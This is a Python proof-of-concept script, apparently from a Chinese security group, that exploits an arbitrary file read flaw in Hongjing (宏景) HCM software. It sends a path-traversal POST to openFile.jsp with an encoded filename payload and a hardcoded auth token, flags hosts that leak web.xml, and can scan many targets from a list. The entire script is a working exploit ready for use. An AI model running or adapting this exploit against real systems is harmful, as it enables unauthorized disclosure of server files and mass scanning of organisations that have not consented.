#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import argparse
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

# 打印颜色
RED = '\033[91m'
RESET = '\033[0m'
# 禁用不安全请求警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        # 构建攻击URL
        attack_url = url.rstrip('/') + "/templates/attestation/%2e%2e/%2e%2e/general/muster/hmuster/openFile.jsp"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
            'x-auth-token': 'd9eaeacd5de1008fd43f737c853dcbcb',
            'Content-Type': 'application/x-www-form-urlencoded',
        }

        # Prepare the data payload as if it were URL encoded.
        data = {
            'filename': '8uHo1M8Ok6bZ468mKmzw70ounZHwKUWnpVOrvOAV6WoPAATTP3HJDPAATTP'
        }
        #print(attack_url)
        # 向服务器发送请求
        response = requests.post(attack_url,headers=headers, data=data, verify=False, timeout=10)
  
        # 检查响应状态码和响应体中的关键字
        #print(response.text)
        if response.status_code == 200 and 'web-app' in response.text:
            print(f"{RED}URL [{url}] 宏景HCM openFile任意文件读取漏洞。{RESET}")
        else:
            print(f"URL [{url}] 未发现漏洞。")
    except RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检查目标URL是否存在宏景HCM openFile任意文件读取漏洞。')
    parser.add_argument('-u', '--url', help='指定目标URL')
    parser.add_argument('-f', '--file', help='指定包含多个目标URL的文本文件')

    args = parser.parse_args()

    if args.url:
        # 如果URL未以http://或https://开头，则添加http://
        args.url = "http://" + args.url.strip("/") if not args.url.startswith(("http://", "https://")) else args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                url = "http://" + url.strip("/") if not url.startswith(("http://", "https://")) else url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
